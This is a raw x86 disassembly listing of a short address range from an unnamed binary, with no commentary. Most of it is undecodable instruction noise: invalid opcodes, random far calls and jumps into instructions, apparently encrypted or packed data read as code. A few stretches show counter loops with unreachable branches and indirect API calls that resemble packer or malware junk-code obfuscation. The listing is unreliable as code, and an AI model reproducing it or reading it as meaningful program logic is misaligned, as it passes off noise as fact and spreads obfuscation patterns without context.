  4018a1:	imul   edi,DWORD PTR [ebx],0xffffffb2
  4018a4:	ins    BYTE PTR es:[edi],dx
  4018a5:	push   ebx
  4018a6:	cli    
  4018a7:	cmp    dl,BYTE PTR [edi-0x6cdfa7b2]
  4018ad:	xchg   DWORD PTR [eax-0x70],edx
  4018b0:	iret   
  4018b1:	(bad)  
  4018b2:	sub    al,0x3b
  4018b4:	inc    eax
  4018b5:	jmp    0x40190e
  4018b7:	imul   edi,DWORD PTR [ecx+0x64],0xe1d7c6b9
  4018be:	fidivr WORD PTR [eax+0x10]
  4018c1:	or     esp,DWORD PTR [ecx]
  4018c3:	shl    ecx,1
  4018c5:	inc    ecx
  4018c6:	outs   dx,DWORD PTR ds:[esi]
  4018c7:	repnz aas 
  4018c9:	cmovp  esi,DWORD PTR ds:0xb2858c10
  4018d0:	enter  0xe9da,0x62
  4018d4:	xor    al,BYTE PTR [esi-0x6c]
  4018d7:	icebp  
  4018d8:	call   DWORD PTR [eax+ebx*4-0x7d]
  4018dc:	out    dx,al
  4018dd:	pushf  
  4018de:	and    eax,DWORD PTR [ecx-0x41]
  4018e1:	bound  esi,QWORD PTR [ebp-0x17e20acb]
  4018e7:	cld    
  4018e8:	popf   
  4018e9:	hlt    
  4018ea:	mov    ebx,eax
  4018ec:	(bad)  
  4018ed:	fisub  DWORD PTR [ebx]
  4018ef:	or     ch,ah
  4018f1:	mov    ds:0x92f93c61,al
  4018f6:	sbb    edx,esp
  4018f8:	mov    ds:0xae4eed9f,al
  4018fd:	xchg   ecx,eax
  4018fe:	or     edi,edi
  401900:	jge    0x40196a
  401902:	int3   
  401903:	(bad)  
  401904:	arpl   WORD PTR [ebx+esi*4],cx
  401907:	aad    0x61
  401909:	int    0x19
  40190b:	or     ecx,DWORD PTR [edx+0x1fe8262d]
  401911:	aaa    
  401912:	jmp    0x9bccbe38
  401917:	aas    
  401918:	sar    BYTE PTR [edi+ecx*1+0x64df25a6],cl
  40191f:	(bad)  
  401921:	sub    esp,edx
  401923:	sahf   
  401924:	dec    eax
  401925:	into   
  401926:	dec    ebp
  401927:	out    0x14,eax
  401929:	pop    edi
  40192a:	xor    BYTE PTR [edi],dh
  40192c:	jne    0x4019a6
  40192e:	push   eax
  40192f:	sub    DWORD PTR ds:0x4f0a61bd,esp
  401935:	mov    edi,0xb0c92ca1
  40193a:	fld    QWORD PTR [edi]
  40193c:	shl    DWORD PTR [edi-0x51],1
  40193f:	retf   
  401940:	test   eax,0xa16e1e9f
  401945:	adc    esi,DWORD PTR [edi]
  401947:	loope  0x4018f7
  401949:	adc    eax,0x7ab5f0bc
  40194e:	mov    eax,ds:0x292a0d95
  401953:	lods   al,BYTE PTR ds:[esi]
  401954:	xor    ch,BYTE PTR [eax-0x71]
  401957:	mov    ecx,0xee39f554
  40195c:	imul   ecx,DWORD PTR [edi],0xfffffff1
  40195f:	sub    DWORD PTR [ebx+0x32c0c80a],edi
  401965:	mov    dh,0x70
  401967:	cli    
  401968:	lods   eax,DWORD PTR ds:[esi]
  401969:	loopne 0x401968
  40196b:	dec    eax
  40196c:	or     edi,DWORD PTR [edi-0x3f]
  40196f:	jl     0x4019dd
  401971:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401972:	aam    0x80
  401974:	aas    
  401975:	jbe    0x401973
  401977:	addr16 adc eax,0x33ed40f2
  40197d:	ja     0x4019b9
  40197f:	cmp    DWORD PTR [edx],edi
  401981:	cmc    
  401982:	add    eax,edi
  401984:	mov    DWORD PTR [ecx],eax
  401986:	sbb    ecx,ecx
  401988:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  40198f:	lea    eax,[ebp-0x14]
  401992:	jmp    0x401c31
  401997:	xlat   BYTE PTR ds:[ebx]
  401998:	ret    
  401999:	ds ret 0xc1da
  40199d:	fcmovnu st,st(1)
  40199f:	loope  0x4019b4
  4019a1:	xchg   ch,dh
  4019a3:	aam    0xed
  4019a5:	mov    bh,0x9c
  4019a7:	add    BYTE PTR [ecx],0x78
  4019aa:	js     0x4019aa
  4019ac:	jle    0x401a26
  4019ae:	js     0x4019ac
  4019b0:	dec    esp
  4019b1:	pushf  
  4019b2:	pop    esp
  4019b3:	xchg   edx,eax
  4019b4:	push   edi
  4019b5:	inc    edi
  4019b6:	bound  esi,QWORD PTR [eax]
  4019b8:	inc    esp
  4019b9:	pop    ecx
  4019ba:	cs adc al,0x2a
  4019bd:	adc    ch,BYTE PTR [ebp-0x4b693929]
  4019c3:	ffree  st(7)
  4019c5:	sbb    al,0xeb
  4019c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4019c8:	xor    DWORD PTR ds:0x7fa2c8b3,edi
  4019ce:	and    eax,0xf7aab332
  4019d3:	imul   esi,DWORD PTR [ebx-0x70265076],0xffffffc7
  4019da:	jnp    0x4019dd
  4019dc:	sbb    eax,0x43826cc2
  4019e1:	lods   eax,DWORD PTR ds:[esi]
  4019e2:	sub    eax,DWORD PTR [edi+0x7a01203e]
  4019e8:	inc    eax
  4019e9:	mov    bh,0xe2
  4019eb:	mul    BYTE PTR [ebx+0x44458b32]
  4019f1:	lea    eax,[ecx-0x51]
  4019f4:	push   edx
  4019f5:	dec    esi
  4019f6:	fidiv  DWORD PTR [ebp+0x6e]
  4019f9:	push   es
  4019fa:	ins    DWORD PTR es:[edi],dx
  4019fb:	leave  
  4019fc:	cmp    DWORD PTR [edx],ebp
  4019fe:	mov    dh,0xa2
  401a00:	or     DWORD PTR [edx+0x54245c64],esi
  401a06:	int    0x1f
  401a08:	ja     0x4019bf
  401a0a:	fdiv   st(4),st
  401a0c:	pusha  
  401a0d:	test   al,0x8c
  401a0f:	loop   0x401a3c
  401a11:	push   ds
  401a12:	push   esi
  401a13:	je     0x401a63
  401a15:	pop    ecx
  401a16:	fsubr  st,st(7)
  401a18:	xor    al,0xdd
  401a1a:	push   esp
  401a1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a1c:	xor    bl,BYTE PTR [ebx+0x7d302c2d]
  401a22:	pop    ebx
  401a23:	and    eax,0xef5206ed
  401a28:	into   
  401a29:	add    BYTE PTR [esi-0x6ff21102],bh
  401a2f:	cmp    DWORD PTR [esi+0x7c],eax
  401a32:	and    BYTE PTR [ebp-0x78],0x4c
  401a36:	lahf   
  401a37:	cmc    
  401a38:	xchg   ebp,eax
  401a39:	mov    ebx,fs
  401a3b:	jl     0x401a02
  401a3d:	jecxz  0x401aa8
  401a3f:	xchg   esp,eax
  401a40:	shr    BYTE PTR [ebp+0x3102f456],cl
  401a46:	inc    esp
  401a47:	(bad)  
  401a48:	lods   al,BYTE PTR ds:[esi]
  401a49:	pop    es
  401a4a:	xchg   ebx,eax
  401a4b:	pop    ebp
  401a4c:	in     al,dx
  401a4d:	jmp    0x401a8e
  401a4f:	je     0x401a4b
  401a51:	and    BYTE PTR [ecx+0x16],bl
  401a54:	xchg   ecx,eax
  401a55:	test   ebx,edx
  401a57:	and    al,0xd5
  401a59:	adc    DWORD PTR [esp+ebp*2],edi
  401a5c:	outs   dx,BYTE PTR ds:[esi]
  401a5d:	dec    esp
  401a5e:	jne    0x401aa7
  401a60:	jmp    0x401a53
  401a62:	add    DWORD PTR [ebp+0x3d546e74],edx
  401a68:	test   DWORD PTR [edx-0xb3719ce],0x715a1b00
  401a72:	jb     0x401a9f
  401a74:	jg     0x401a1d
  401a76:	loope  0x401a76
  401a78:	jae    0x401a61
  401a7a:	in     eax,0xa6
  401a7c:	mov    dh,BYTE PTR [edx]
  401a7e:	pop    eax
  401a7f:	(bad)  
  401a80:	retf   
  401a81:	das    
  401a82:	std    
  401a83:	add    eax,0x238c36f3
  401a88:	jg     0x401a9b
  401a8a:	jbe    0x401a4f
  401a8c:	xchg   edi,eax
  401a8d:	sub    BYTE PTR [edx],cl
  401a8f:	pop    ebp
  401a90:	out    0x17,al
  401a92:	xchg   al,ah
  401a94:	stc    
  401a95:	and    al,0x3b
  401a97:	clc    
  401a98:	push   0xffffff8d
  401a9a:	adc    BYTE PTR [edi-0x41011805],al
  401aa0:	sbb    al,BYTE PTR [esi]
  401aa2:	xchg   BYTE PTR [ebp-0x73c77e84],al
  401aa8:	les    ebx,FWORD PTR [ecx]
  401aaa:	jbe    0x401a9a
  401aac:	mov    ebx,0x3e44ff1e
  401ab1:	pop    esi
  401ab2:	retf   0x23c4
  401ab5:	out    dx,al
  401ab6:	mov    esi,0xb8b9186e
  401abb:	mov    dh,0x88
  401abd:	mov    dl,0xd4
  401abf:	popa   
  401ac0:	inc    ebx
  401ac1:	inc    edx
  401ac2:	retf   0xdc2c
  401ac5:	sub    al,0x97
  401ac7:	inc    eax
  401ac8:	shl    DWORD PTR [esp+edi*8+0x78039b08],0xa3
  401ad0:	cmp    BYTE PTR [ebp-0x6c],cl
  401ad3:	call   0x8120:0x9cd52743
  401ada:	jp     0x401a93
  401adc:	bound  esi,QWORD PTR [esi+edx*4]
  401adf:	clc    
  401ae0:	mov    bl,0xd1
  401ae2:	jg     0x401a78
  401ae4:	xchg   ebp,eax
  401ae5:	ds js  0x401b12
  401ae8:	ret    
  401ae9:	push   esi
  401aea:	lods   eax,DWORD PTR ds:[esi]
  401aeb:	outs   dx,DWORD PTR ss:[esi]
  401aed:	add    eax,0x5f8bc684
  401af2:	test   DWORD PTR [ebx],0x7fdde297
  401af8:	es cdq 
  401afa:	(bad)  
  401afb:	aaa    
  401afc:	add    BYTE PTR [ebx],ah
  401afe:	mov    dh,0x79
  401b00:	ds out 0xc,eax
  401b03:	lock xor dh,BYTE PTR [ecx]
  401b06:	mov    dl,0xd8
  401b08:	xor    eax,DWORD PTR [edx]
  401b0a:	pop    edi
  401b0b:	sbb    DWORD PTR [ecx-0x6b],esp
  401b0e:	and    eax,0x1fa63648
  401b13:	lock xchg ecx,eax
  401b15:	das    
  401b16:	sub    eax,0x225ffc73
  401b1b:	xor    ecx,edi
  401b1d:	adc    BYTE PTR [ecx],ah
  401b1f:	and    DWORD PTR [edi-0x36],ebp
  401b22:	cs xchg esp,eax
  401b24:	es add cl,cl
  401b27:	vpaddsb xmm5,xmm7,XMMWORD PTR [esp+ecx*8-0x2f]
  401b2d:	xor    DWORD PTR [esi],esp
  401b2f:	cli    
  401b30:	xchg   DWORD PTR [eax-0x74f709c9],esp
  401b36:	std    
  401b37:	adc    ch,BYTE PTR [eax+0x64]
  401b3a:	sbb    BYTE PTR [ecx+ecx*1+0x616968eb],ah
  401b41:	addr16 sbb eax,0x33ffb76c
  401b47:	push   edx
  401b48:	pushf  
  401b49:	mov    edi,0xec35df2b
  401b4e:	push   eax
  401b4f:	xchg   edi,eax
  401b50:	ds xchg edi,eax
  401b52:	push   eax
  401b53:	fs jne 0x401b1e
  401b56:	mov    WORD PTR [ecx-0x14],es
  401b59:	cwde   
  401b5a:	in     eax,0x55
  401b5c:	adc    edx,DWORD PTR [ecx+0x33d155ea]
  401b62:	mov    ecx,0x2d8ac5fe
  401b67:	push   cs
  401b68:	cwde   
  401b69:	in     eax,0x9e
  401b6b:	inc    esi
  401b6c:	test   DWORD PTR [ebx+eiz*2],ebp
  401b6f:	push   ebx
  401b70:	popf   
  401b71:	les    edx,FWORD PTR [ecx]
  401b73:	retf   
  401b74:	inc    eax
  401b75:	imul   ecx,DWORD PTR [esi+ebp*4],0x7a
  401b79:	inc    ebp
  401b7a:	ins    BYTE PTR es:[edi],dx
  401b7b:	pop    eax
  401b7c:	imul   esi,ebp,0xecd0d5c5
  401b82:	mov    bl,0xd5
  401b84:	cmp    esi,DWORD PTR [edx]
  401b86:	mov    dl,BYTE PTR [edx+0x4d6669da]
  401b8c:	add    eax,0xabec95c0
  401b91:	out    0x98,al
  401b93:	add    al,0xfe
  401b95:	and    eax,0x15262c95
  401b9a:	rol    bl,1
  401b9c:	std    
  401b9d:	pop    esi
  401b9e:	inc    edi
  401b9f:	imul   ebp,esi,0xd71425e
  401ba5:	nop
  401ba6:	jmp    0x401b91
  401ba8:	dec    ecx
  401ba9:	out    0xd4,al
  401bab:	push   ebp
  401bac:	out    0xe,al
  401bae:	dec    eax
  401baf:	push   ecx
  401bb0:	push   edx
  401bb1:	cmp    al,0x7c
  401bb3:	cmc    
  401bb4:	xor    ebx,DWORD PTR [esp+ebx*2]
  401bb7:	iret   
  401bb8:	cmp    edx,DWORD PTR [edx-0x7d9f84e4]
  401bbe:	(bad)  
  401bbf:	xlat   BYTE PTR ds:[ebx]
  401bc0:	sahf   
  401bc1:	adc    al,0xeb
  401bc3:	out    0x6e,al
  401bc5:	data16 mov ch,0x7e
  401bc8:	mov    DWORD PTR [esi],eax
  401bca:	js     0x401b6f
  401bcc:	sbb    edi,0xffffff9e
  401bcf:	fmul   DWORD PTR [ebp+eax*4-0x77]
  401bd3:	xor    DWORD PTR [ecx],esp
  401bd5:	cld    
  401bd6:	loopne 0x401ba2
  401bd8:	test   eax,0x679573e0
  401bdd:	push   ebp
  401bde:	retf   
  401bdf:	in     al,0xe0
  401be1:	sub    DWORD PTR [esi-0x49],0x5f183c23
  401be8:	imul   ecx,DWORD PTR [edx+ecx*2+0x409b9832],0x46
  401bf0:	outs   dx,BYTE PTR ds:[esi]
  401bf1:	call   0x865b9a9f
  401bf6:	shl    DWORD PTR [eax-0x55],1
  401bf9:	(bad)  
  401bfa:	push   eax
  401bfb:	push   edx
  401bfc:	xchg   edx,eax
  401bfe:	push   es
  401bff:	and    dl,cl
  401c01:	sub    eax,0x48640f
  401c06:	jno    0x401c1b
  401c08:	push   edx
  401c09:	mov    ch,BYTE PTR [edi-0x1e]
  401c0c:	pop    ss
  401c0d:	stos   BYTE PTR es:[edi],al
  401c0e:	mov    WORD PTR [edx],?
  401c10:	sub    eax,0xff6da463
  401c15:	xchg   edi,eax
  401c16:	sar    BYTE PTR [eax],cl
  401c18:	mov    esp,0x4cb88d82
  401c1d:	or     edi,DWORD PTR [ecx+0x510b1127]
  401c23:	xchg   edi,eax
  401c24:	mov    dl,BYTE PTR [eax-0x49]
  401c27:	add    BYTE PTR [edi+0x34],cl
  401c2a:	ror    ah,0x52
  401c2d:	jecxz  0x401bfa
  401c2f:	push   esp
  401c30:	jecxz  0x401bbb
  401c32:	inc    ebp
  401c33:	loopne 0x401bb6
  401c35:	and    eax,0x42a83d
  401c3a:	add    BYTE PTR [eax],al
  401c3c:	add    BYTE PTR [eax],al
  401c3e:	jmp    0x401c4e
  401c43:	mov    eax,ds:0x42a83d
  401c48:	inc    eax
  401c49:	mov    ds:0x42a83d,eax
  401c4e:	cmp    DWORD PTR ds:0x42a83d,0x18
  401c55:	jae    0x401c9b
  401c5b:	cmp    DWORD PTR ds:0x42a83d,0xa
  401c62:	jne    0x401c7b
  401c68:	push   0x6bd9
  401c6d:	push   DWORD PTR [ebp-0x1c]
  401c70:	push   0x42aa2e
  401c75:	call   DWORD PTR ds:0x41d0bc
  401c7b:	cmp    DWORD PTR ds:0x42a83d,0x9
  401c82:	jne    0x401c96
  401c88:	xor    eax,eax
  401c8a:	xor    eax,DWORD PTR ds:0x42a83d
  401c90:	inc    eax
  401c91:	mov    ds:0x42a83d,eax
  401c96:	jmp    0x401c43
  401c9b:	mov    eax,DWORD PTR [ebp-0x14]
  401c9e:	sbb    DWORD PTR ds:0x42a761,0x47a9
  401ca8:	mov    ecx,DWORD PTR [ebp-0x20]
  401cab:	dec    DWORD PTR ds:0x42a775
  401cb1:	xor    eax,esi
  401cb3:	add    eax,edi
  401cb5:	mov    DWORD PTR [ecx],eax
  401cb7:	movzx  eax,WORD PTR ds:0x42a769
  401cbe:	and    eax,DWORD PTR ds:0x42a7b9
  401cc4:	mov    ds:0x42a769,eax
  401cc9:	mov    eax,ds:0x41ebba
  401cce:	mov    ebx,0x8e12febf
  401cd3:	adc    DWORD PTR ds:0x42a7f9,0x42a801
  401cdd:	mov    DWORD PTR [ebp-0xc],ebx
  401ce0:	xor    DWORD PTR ds:0x42a77d,0x1391
  401cea:	mov    eax,DWORD PTR [eax]
  401cec:	mov    cx,WORD PTR [ebp-0x4]
  401cf0:	movzx  ecx,cx
  401cf3:	jmp    0x401f92
  401cf8:	retf   
  401cf9:	iret   
  401cfa:	cmp    al,0x3d
  401cfc:	aam    0xd1
  401cfe:	leave  
  401cff:	fldcw  WORD PTR [edx-0x16]
  401d02:	retf   0xaeba
  401d05:	imul   ebx
  401d07:	popa   
  401d08:	add    BYTE PTR [esi],al
  401d0a:	js     0x401d84
  401d0c:	(bad)  
  401d0d:	jle    0x401d87
  401d0f:	js     0x401d28
  401d11:	js     0x401d34
  401d13:	jnp    0x401d21
  401d15:	leave  
  401d16:	sub    esp,eax
  401d18:	add    ah,BYTE PTR [edx-0x1a9240d1]
  401d1e:	rcl    eax,1
  401d20:	cmp    esp,DWORD PTR [edi]
  401d22:	(bad)  
  401d23:	sar    dl,cl
  401d25:	inc    edi
  401d26:	ins    BYTE PTR es:[edi],dx
  401d27:	sub    bh,ah
  401d29:	sub    eax,0xe3c3ed6c
  401d2e:	sbb    edx,DWORD PTR [edi-0x2a6e6da9]
  401d34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d35:	nop
  401d36:	xor    al,0x67
  401d38:	aaa    
  401d39:	cwde   
  401d3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d3b:	fwait
  401d3c:	enter  0xb2bb,0xe7
  401d40:	sub    al,0x7c
  401d42:	adc    al,al
  401d44:	imul   eax,DWORD PTR [esi+0x3c],0x9032425e
  401d4b:	(bad)  
  401d4c:	cmp    ebx,DWORD PTR [ecx-0x4bf36571]
  401d52:	cmp    eax,0x21500f38
  401d57:	sti    
  401d58:	sar    DWORD PTR [esi+0x61],0x41
  401d5c:	cdq    
  401d5d:	inc    edi
  401d5e:	push   es
  401d5f:	pop    edi
  401d60:	stc    
  401d61:	not    DWORD PTR [esi]
  401d63:	ja     0x401d35
  401d65:	or     bl,BYTE PTR [ebx]
  401d67:	mov    BYTE PTR [edi],bl
  401d69:	xor    al,0x71
  401d6b:	jle    0x401dba
  401d6d:	dec    eax
  401d6e:	mov    WORD PTR [ecx],ss
  401d70:	dec    ebp
  401d71:	sbb    edi,DWORD PTR [edi]
  401d73:	bound  ecx,QWORD PTR [eax-0x530cdb5c]
  401d79:	mov    dh,0xdd
  401d7b:	mov    al,0x1b
  401d7d:	mov    dh,0x44
  401d7f:	rol    DWORD PTR [ecx],1
  401d81:	fcom   QWORD PTR [ebx]
  401d83:	adc    esi,ebx
  401d85:	adc    dl,bl
  401d87:	dec    esp
  401d88:	les    ecx,FWORD PTR [edi+0x47e6cb68]
  401d8e:	jecxz  0x401ddb
  401d90:	pop    ebx
  401d91:	fld    st(4)
  401d93:	jb     0x401e0e
  401d95:	push   edi
  401d96:	inc    ebp
  401d97:	fdivr  st(6),st
  401d99:	mov    edi,0x10c57fec
  401d9e:	outs   dx,BYTE PTR ds:[esi]
  401d9f:	pop    es
  401da0:	ins    DWORD PTR es:[edi],dx
  401da1:	xchg   esp,eax
  401da2:	fs retf 
  401da4:	(bad)
  401da7:	into   
  401da8:	xchg   edx,eax
  401da9:	(bad)  
  401daa:	push   ebp
  401dab:	mov    WORD PTR [edx],ss
  401dad:	push   es
  401dae:	fsubr  DWORD PTR [edx-0x9]
  401db1:	fldenv [edi]
  401db3:	push   esi
  401db4:	mov    esp,DWORD PTR [edx]
  401db6:	sbb    edi,edx
  401db8:	fistp  WORD PTR [edx]
  401dba:	pop    ss
  401dbb:	aas    
  401dbc:	lock shr ah,0xff
  401dc0:	jae    0x401dbe
  401dc2:	sahf   
  401dc3:	jmp    0x947b619b
  401dc8:	scas   al,BYTE PTR es:[edi]
  401dc9:	pop    ds
  401dca:	mov    ds:0x7db4648b,eax
  401dcf:	cmp    BYTE PTR [ebp-0x58],bh
  401dd2:	push   es
  401dd3:	push   cs
  401dd4:	mov    al,ds:0x587ce9f8
  401dd9:	mov    bh,0x58
  401ddb:	and    edx,DWORD PTR [esi]
  401ddd:	call   0xba25f5d6
  401de2:	xchg   ebp,eax
  401de3:	fstp   TBYTE PTR [edx+0x7a934fa8]
  401de9:	dec    edi
  401dea:	(bad)  
  401deb:	sti    
  401dec:	shl    bh,cl
  401dee:	inc    ebx
  401def:	lds    eax,FWORD PTR [edx-0x41]
  401df2:	ss (bad) 
  401df4:	or     ch,dl
  401df6:	mov    dh,0xd2
  401df8:	outs   dx,BYTE PTR ds:[esi]
  401df9:	xchg   edi,eax
  401dfa:	fsubr  QWORD PTR [ebp+ebp*4+0x676a7587]
  401e01:	cld    
  401e02:	mov    al,0xb3
  401e04:	ds pop esp
  401e06:	imul   esp,edx,0x5e
  401e09:	lds    eax,FWORD PTR [ebp+0x36]
  401e0c:	out    0xe9,al
  401e0e:	aas    
  401e0f:	shr    bh,0x3
  401e12:	and    al,0x7d
  401e14:	jne    0x401dcb
  401e16:	xor    ebx,DWORD PTR [eax]
  401e18:	cmp    DWORD PTR [eax],ebx
  401e1a:	push   ds
  401e1b:	fnsave [ebx+0x64cd8c78]
  401e21:	ins    BYTE PTR es:[edi],dx
  401e22:	dec    esp
  401e23:	leave  
  401e24:	out    dx,al
  401e25:	loopne 0x401e3e
  401e27:	push   0x302b8351
  401e2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e2d:	pop    esi
  401e2e:	loop   0x401e87
  401e30:	pop    es
  401e31:	mov    eax,ds:0x107ad3d
  401e36:	jae    0x401e36
  401e38:	pop    ss
  401e39:	mov    esi,0x51c21857
  401e3e:	imul   eax,DWORD PTR cs:[edx+0xd],0x7a
  401e43:	bt     DWORD PTR [ecx],edx
  401e46:	lahf   
  401e47:	mov    edi,0xbbb89682
  401e4c:	mov    ch,0xcf
  401e4e:	leave  
  401e4f:	jge    0x401dd5
  401e51:	(bad)  
  401e52:	fdivr  QWORD PTR [edx+0xce8b495]
  401e58:	adc    ch,bh
  401e5a:	inc    edi
  401e5b:	jge    0x401e46
  401e5d:	outs   dx,DWORD PTR ds:[esi]
  401e5e:	bound  ebp,QWORD PTR [esi]
  401e60:	mov    esp,0x780e53bd
  401e65:	pop    edx
  401e66:	cmp    BYTE PTR [edi-0xa88fc39],al
  401e6c:	pop    es
  401e6d:	and    dl,BYTE PTR [ebx-0x56065b5f]
  401e73:	mov    ecx,0x8fa3237d
  401e78:	loopne 0x401e72
  401e7a:	mov    ah,0xca
  401e7c:	imul   ebp,DWORD PTR [esi+eax*4+0x56],0xffffffb6
  401e81:	jne    0x401e62
  401e83:	test   DWORD PTR [eax+0x2c],esi
  401e86:	pop    ebp
  401e87:	mov    ds:0x1d37ea34,eax
  401e8c:	and    BYTE PTR ds:0xd5c60978,0x33
  401e93:	jbe    0x401e67
  401e95:	adc    eax,0xce170f4b
  401e9a:	sbb    BYTE PTR [ebx-0x38],cl
  401e9d:	sub    DWORD PTR [edx],ecx
  401e9f:	rcr    bh,cl
  401ea1:	xchg   DWORD PTR [edi-0x1d0884b8],ecx
  401ea7:	dec    esp
  401ea8:	out    0x99,al
  401eaa:	or     al,0x75
  401eac:	dec    esp
  401ead:	dec    esi
  401eae:	ret    
  401eaf:	push   esp
  401eb0:	in     al,0x30
  401eb2:	call   0x6382:0xeee6809c
  401eb9:	mov    DWORD PTR [edi],ebx
  401ebb:	arpl   WORD PTR gs:[eax],bx
  401ebe:	int    0x85
  401ec0:	mov    ah,0x91
  401ec2:	test   al,0xb6
  401ec4:	icebp  
  401ec5:	inc    ebx
  401ec6:	loope  0x401f01
  401ec8:	dec    edx
  401ec9:	call   0xaa9a:0xb40bd623
  401ed0:	je     0x401f00
  401ed2:	in     eax,dx
  401ed3:	sbb    al,0xde
  401ed5:	arpl   WORD PTR [esp+ebp*8-0x7a],bp
  401ed9:	test   BYTE PTR [esi+0x7ec4e18c],al
  401edf:	lahf   
  401ee0:	mov    ebp,0x9b7795d1
  401ee5:	sahf   
  401ee6:	fs (bad) 
  401ee8:	retf   
  401ee9:	xlat   BYTE PTR ds:[ebx]
  401eea:	push   ss
  401eeb:	dec    ebp
  401eec:	xchg   edx,eax
  401eed:	xchg   ebp,eax
  401eee:	fldenv [ecx-0x1c2715bf]
  401ef4:	out    0x20,al
  401ef6:	imul   BYTE PTR ds:[esi-0x37f10a1c]
  401efd:	mov    esi,0xe16e90df
  401f02:	es loope 0x401f63
  401f05:	xor    BYTE PTR ds:0x9a0bf04b,0x49
  401f0c:	leave  
  401f0d:	jne    0x401f37
  401f0f:	ficomp DWORD PTR [esp+eiz*2]
  401f12:	(bad)  [edi-0x48]
  401f15:	adc    al,0x1e
  401f17:	push   esp
  401f18:	scas   al,BYTE PTR es:[edi]
  401f19:	ret    0x2d67
  401f1c:	jg     0x401f3d
  401f1e:	jns    0x401ed0
  401f20:	(bad)  
  401f21:	retf   
  401f22:	mov    eax,0x4da97dea
  401f27:	sbb    al,dh
  401f29:	add    eax,0x6a555996
  401f2e:	aam    0x74
  401f30:	clc    
  401f31:	test   edx,edi
  401f33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f34:	shl    DWORD PTR [edi],cl
  401f36:	jnp    0x401f68
  401f38:	lahf   
  401f39:	(bad)  
  401f3a:	popf   
  401f3b:	mov    edx,0x813617fd
  401f40:	je     0x401f26
  401f42:	loop   0x401f8a
  401f44:	mov    bl,0x5a
  401f46:	popf   
  401f47:	inc    ebp
  401f48:	inc    esp
  401f49:	and    ch,cl
  401f4b:	mov    eax,ds:0x29da348c
  401f50:	cwde   
  401f51:	adc    BYTE PTR [ebx],dl
  401f53:	aad    0x1c
  401f55:	cmp    BYTE PTR [esp+eiz*2],ah
  401f58:	jp     0x401f52
  401f5a:	rcr    DWORD PTR [edi-0x58],0x1a
  401f5e:	mov    esp,0xd36040f5
  401f63:	jge    0x401fcf
  401f65:	jp     0x401f8b
  401f67:	cmp    BYTE PTR [ebp-0x93833ea],ch
  401f6d:	dec    eax
  401f6e:	ins    DWORD PTR es:[edi],dx
  401f6f:	or     DWORD PTR [ecx],ebx
  401f71:	pop    esp
  401f72:	or     BYTE PTR [ecx-0x42],dh
  401f75:	or     al,BYTE PTR [edx]
  401f77:	push   esp
  401f78:	test   DWORD PTR ds:0x611224db,edx
  401f7e:	outs   dx,BYTE PTR ds:[esi]
  401f7f:	sbb    DWORD PTR [esi+0x9b9ed49],ebx
  401f85:	call   0xb821:0xe640ba05
  401f8c:	mov    ecx,0xb70e7d16
  401f91:	rol    DWORD PTR [ebx],0x8
  401f94:	xor    eax,eax
  401f96:	add    eax,DWORD PTR ds:0x42a839
  401f9c:	and    eax,DWORD PTR ds:0x42a889
  401fa2:	mov    ds:0x42a839,eax
  401fa7:	mov    DWORD PTR [ebp-0x18],ecx
  401faa:	add    DWORD PTR ds:0x42a7f1,0x598
  401fb4:	mov    eax,DWORD PTR [ebp+0x8]
  401fb7:	and    DWORD PTR ds:0x42a759,0x0
  401fc1:	jmp    0x401fd3
  401fc6:	mov    ecx,DWORD PTR ds:0x42a759
  401fcc:	inc    ecx
  401fcd:	mov    DWORD PTR ds:0x42a759,ecx
  401fd3:	cmp    DWORD PTR ds:0x42a759,0x11
  401fda:	jae    0x402003
  401fe0:	cmp    DWORD PTR ds:0x42a759,0x1b
  401fe7:	jne    0x401ffe
  401fed:	push   0x275b
  401ff2:	push   DWORD PTR [ebp-0x20]
  401ff5:	push   DWORD PTR [ebp-0x28]
  401ff8:	call   DWORD PTR ds:0x41d184
  401ffe:	jmp    0x401fc6
  402003:	mov    ecx,DWORD PTR [ebp-0x8]
  402006:	jmp    0x4022a5
  40200b:	rcl    cl,0xcf
  40200e:	ret    
  40200f:	fld    st(1)
  402011:	aam    0xd9
  402013:	push   ecx
  402014:	shl    bh,1
  402016:	cmp    DWORD PTR [eax-0x796ddcd0],esi
  40201c:	add    al,0x78
  40201e:	js     0x40201e
  402020:	jle    0x40209a
  402022:	js     0x402016
  402024:	mov    esp,0x54f78923
  402029:	xchg   BYTE PTR [eax+0x25a12cff],dl
  40202f:	dec    esp
  402030:	inc    esi
  402031:	loope  0x40204b
  402033:	dec    esp
  402034:	dec    ebx
  402035:	inc    ecx
  402036:	push   0x5d335c47
  40203b:	in     al,dx
  40203c:	das    
  40203d:	and    ecx,DWORD PTR [edi-0x6a3036d7]
  402043:	adc    al,0xc2
  402045:	in     al,dx
  402046:	jmp    0xc07:0x3548f7b7
  40204d:	xor    al,0xc9
  40204f:	aas    
  402050:	push   ss
  402051:	sbb    DWORD PTR [ebp-0x15],0x31
  402055:	adc    ebx,edx
  402057:	fcmove st,st(3)
  402059:	adc    eax,0x79b22436
  40205e:	lods   eax,DWORD PTR ds:[esi]
  40205f:	ds mov edx,0x91704df5
  402065:	pop    esi
  402066:	fwait
  402067:	mov    edi,0x8327e45f
  40206c:	out    0x40,al
  40206e:	cdq    
  40206f:	rcr    DWORD PTR [eax],1
  402071:	jnp    0x40206d
  402073:	ror    edi,1
  402075:	mov    ds,WORD PTR [eax+eax*4+0x55]
  402079:	hlt    
  40207a:	cmp    ecx,ecx
  40207c:	lods   eax,DWORD PTR ds:[esi]
  40207d:	jns    0x402045
  40207f:	and    al,bl
  402081:	mov    cl,dl
  402083:	xchg   edi,eax
  402084:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402085:	jge    0x40207c
  402087:	lock add ebp,DWORD PTR ds:0xdd99b95a
  40208e:	mov    bh,0x6b
  402090:	mov    ch,0xd2
  402092:	call   0x11d6ea79
  402097:	mov    dh,0x23
  402099:	shr    DWORD PTR [eax+0x1486da4a],0x59
  4020a0:	(bad)  
  4020a1:	push   0xffffffbb
  4020a3:	xchg   esp,eax
  4020a4:	enter  0x8000,0x92
  4020a8:	jmp    0xfd2e:0xa9a9b5fe
  4020af:	das    
